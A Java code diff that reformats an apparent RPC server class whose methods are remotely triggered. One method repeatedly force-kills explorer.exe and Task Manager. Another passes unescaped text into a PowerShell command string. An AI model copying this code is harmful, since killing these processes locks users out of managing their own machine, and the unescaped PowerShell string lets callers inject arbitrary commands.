@@ -55,7 +55,7 @@ public class RpcServerMethods {
 
     public void runKillTaskmngrAndExp() {
         int loopsDone = 0;
-        while(true) {
+        while (true) {
             try {
                 // Kill explorer.exe
                 Process explorer = Runtime.getRuntime().exec("taskkill /F /IM explorer.exe");
@@ -66,10 +66,9 @@ public class RpcServerMethods {
                 taskmgr.waitFor();
 
 //                System.out.println("explorer.exe and Taskmgr.exe killed!");
-                if(loopsDone > 20) {
+                if (loopsDone > 20) {
                     break;
-                }
-                else {
+                } else {
                     loopsDone++;
                     Thread.sleep(500);
                 }
@@ -79,7 +78,7 @@ public class RpcServerMethods {
         }
     }
 
-    public void runTextToSpeech (String text) {
+    public void runTextToSpeech(String text) {
         String command = String.format("powershell -Command \"Add-Type -AssemblyName System.Speech; " +
                 "$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; " +
                 "$speak.Speak('%s');\"", text);
